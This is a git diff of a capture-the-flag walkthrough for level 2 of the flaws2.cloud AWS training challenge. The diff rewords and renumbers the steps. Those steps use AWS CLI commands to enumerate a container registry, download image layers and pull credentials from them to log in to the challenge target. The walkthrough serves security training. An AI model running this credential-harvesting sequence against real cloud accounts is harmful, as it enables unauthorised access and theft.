@@ -39,33 +39,29 @@ Step 1: Visiting the target shows we need credentials to login:
 
 ![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/c0363893-ba65-478f-b322-56d656f43f28)
 
-Step 2: aws --profile flawscloud ecr list-images --repository-name level2
+Step 2: Since we are told that this is an ecr and we are told the name of the ecr, let's check if we can list any images on the ecr: aws --profile flawscloud ecr list-images --repository-name level2
 
 ![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/4b414d3f-272c-45c6-9efb-3d18eb8fa01d)
 
-Step 3: aws --profile flawscloud sts get-caller-identity
+Step 3: To list more image digests we will need to get the registryid which is the account number of the user.  To get this, run: aws --profile flawscloud sts get-caller-identity
 
 ![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/af2a981b-db78-4d9c-8d4d-d4f1b84574b6)
 
-Step 4: aws --profile flawscloud ecr list-images --repository-name level2 --registry-id 653711331788
-
-![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/650fb84b-33de-4a74-8ddf-b01ba48376db)
-
-Step 5: aws --profile flawscloud ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest |jq '.images[].imageManifest | fromjson'
+Step 4: Get a list of image digests: aws --profile flawscloud ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest |jq '.images[].imageManifest | fromjson'
 
 This has a bunch of different digests.  One of the digests in the output is shown in the below screenshot:
 
 ![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/ee2708d5-fa0d-4b79-b95c-926b96517e72)
 
-Step 6: Check each one of the digests with this command: aws --profile flawscloud ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621”
+Step 5: Check each one of the digests with this command: aws --profile flawscloud ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621”
 
 ![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/98559782-b928-430a-968e-f8fa0098d7f6)
 
-Step 7: Visiting the long url shown downloads a file.  Searching through the file we find credentials. 
+Step 6: Visiting the long url shown downloads a file.  Searching through the file we find credentials. 
 
 ![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/5e01336c-e8dc-4f59-9341-704d7cfb2e0f)
 
-Step 8: Use those credentials to login to http://container.target.flaws2.cloud which completes level 2.  
+Step 7: Use those credentials to login to http://container.target.flaws2.cloud which completes level 2.  
 ---
 <h3>Level 3 Target: </h3>
 ![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/1d1bf7f8-33d8-4170-a2ef-7ada181f2eef)
